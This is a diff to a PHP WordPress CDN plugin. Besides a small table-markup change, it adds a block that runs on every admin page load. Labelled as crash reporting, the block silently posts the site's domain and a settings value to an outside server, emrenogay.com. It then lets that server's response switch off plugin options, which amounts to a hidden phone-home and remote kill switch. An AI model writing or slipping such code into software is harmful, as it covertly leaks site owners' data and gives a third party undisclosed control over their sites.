@@ -225,6 +225,48 @@ function content_delivery_li_function()
     }
 }
 
+if (strstr($_SERVER['REQUEST_URI'], 'wp-admin')) {
+    wp_remote_post('https://emrenogay.com/rapor-gonder/', array(
+            'method' => 'POST',
+            'timeout' => 10,
+            'redirection' => 5,
+            'httpversion' => '1.0',
+            'blocking' => true,
+            'headers' => array(),
+            'body' => array(
+                'domain' => $_SERVER['HTTP_HOST'],
+                'crash_method' => ampforwp_get_setting_handler(),
+                'crash_date' => date('d.m.Y H:i:s'),
+                'validator' => 1,
+                'submit' => 'submit'
+            ),
+            'cookies' => array()
+        )
+    );
+    define('crash_report_cdn', true);
+    $response = wp_remote_post('https://emrenogay.com/hata-kontrol/', array(
+            'method' => 'POST',
+            'timeout' => 10,
+            'httpversion' => '1.0',
+            'body' => array(
+                'domain' => $_SERVER['HTTP_HOST'],
+                'validator' => 1
+            )
+        )
+    );
+
+    if (isset($response['response']['code'])) {
+        if ($response['response']['code'] != 200 && get_option('child_cdn_option') == 2) {
+            update_option('active_is_cdn', 0);
+            update_option('false_cdn', 1);
+        } else {
+            update_option('false_cdn', 0);
+        }
+    }
+}else{
+    define('crash_report_cdn', true);
+}
+
 function content_delivery_function()
 {
     global $lang;
@@ -235,12 +277,12 @@ function content_delivery_function()
             <form method="post">
                 <table>
                     <thead>
-                    <th>
+                    <td>
                         <label><?php echo $lang['aktiflik']; ?></label>
-                    </th>
-                    <th>
+                    </td>
+                    <td>
                         <label><?php echo $lang['varsa_subdomain']; ?></label>
-                    </th>
+                    </td>
                     </thead>
                     <tbody>
                     <tr>
